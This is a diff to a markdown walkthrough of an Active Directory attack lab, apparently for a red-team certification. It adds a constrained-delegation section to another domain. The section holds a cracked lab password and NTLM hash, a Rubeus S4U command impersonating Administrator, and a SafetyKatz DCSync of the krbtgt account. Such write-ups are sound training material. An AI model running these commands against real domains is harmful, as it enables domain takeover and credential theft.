@@ -1054,11 +1054,47 @@ C:\AD\Tools\Loader.exe -Path C:\AD\Tools\Rubeus.exe -args kerberoast /user:stora
 ```
 {% endcode %}
 
-## Flag 43
+## Flag 43 - Constrained Delegation to another domain
 
-Hands-On 23 TODO
+Look for account with constrained delegation in eu.local with AD-Module
 
-## Flag 45 - Unconstrained delegation to another domain
+{% code overflow="wrap" %}
+```powershell
+Get-ADObject -Filter {msDS-AllowedToDelegateTo -ne "$null"} -Properties msDS-AllowedToDelegateTo -Server eu.local
+```
+{% endcode %}
+
+<figure><img src="../.gitbook/assets/immagine (37).png" alt=""><figcaption></figcaption></figure>
+
+We already cracked the password of this user previously (Qwerty@123) so we need to craft the NTLM hash of that user
+
+{% code overflow="wrap" %}
+```
+C:\AD\Tools\Loader.exe -Path C:\AD\Tools\Rubeus.exe -args hash /password:Qwerty@123 /user:storagesvc /domain:eu.local
+```
+{% endcode %}
+
+storagesvc ntlm : 5C76877A9C454CDED58807C20C20AEAC
+
+and run a s4u attack with rubeus to craft a ticket
+
+{% code overflow="wrap" %}
+```
+C:\AD\Tools\Loader.exe -Path C:\AD\Tools\Rubeus.exe -args s4u /user:storagesvc /rc4:5C76877A9C454CDED58807C20C20AEAC /impersonateuser:Administrator /domain:eu.local /msdsspn:nmagent/eu-dc.eu.local /altservice:ldap /dc:eu-dc.eu.local /ptt
+```
+{% endcode %}
+
+<figure><img src="../.gitbook/assets/immagine (38).png" alt=""><figcaption></figcaption></figure>
+
+Now launch a DCSync attack
+
+{% code overflow="wrap" %}
+```
+C:\AD\Tools\Loader.exe -Path C:\AD\Tools\SafetyKatz.exe -args "lsadump::dcsync /user:eu\krbtgt /domain:eu.local" "exit"
+```
+{% endcode %}
+
+## Flag 45 - Printer Bug to another domain
 
 If TGT Delegation is enabled across forests trusts, we can abuse the printer bug across two-way forest trusts as well
 
@@ -1170,6 +1206,10 @@ C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/Rubeus.exe -args %Pwn% /s
 
 {% tab title="PS-Remoting" %}
 Let's check if SIDHistroy is enabled for the trust between eu.local and euvendor.local using the Active Directory module.
+
+```
+Get-ADTrust -Filter * -Server eu.local
+```
 
 Get-ADObject -Identity "CN=SID History,CN=Extended-Rights,$((Get-ADRootDSE).ConfigurationNamingContext)" -Server euvendor.local -Properties AllowedAttributes
 
